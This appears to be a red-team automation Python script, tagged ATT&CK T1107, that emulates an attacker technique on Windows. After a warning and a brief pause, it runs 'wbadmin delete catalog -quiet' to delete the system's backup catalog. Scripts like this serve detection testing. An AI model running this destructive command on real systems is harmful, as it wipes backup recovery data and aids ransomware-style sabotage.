# Name: Catalog Deletion with wbadmin.exe
# RTA: delete_catalogs.py
# ATT&CK: T1107
# Description: Uses wbadmin to delete the backup catalog.

import common
import time
import platform


def main():
    # Check if running on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    warning = "Deleting the backup catalog may have unexpected consequences. Operational issues are unknown."
    common.log("WARNING: %s" % warning, log_type="!")
    time.sleep(5)
    # Execute the wbadmin command to delete the catalog
    common.execute(["wbadmin", "delete", "catalog", "-quiet"])


if __name__ == "__main__":
    exit(main())
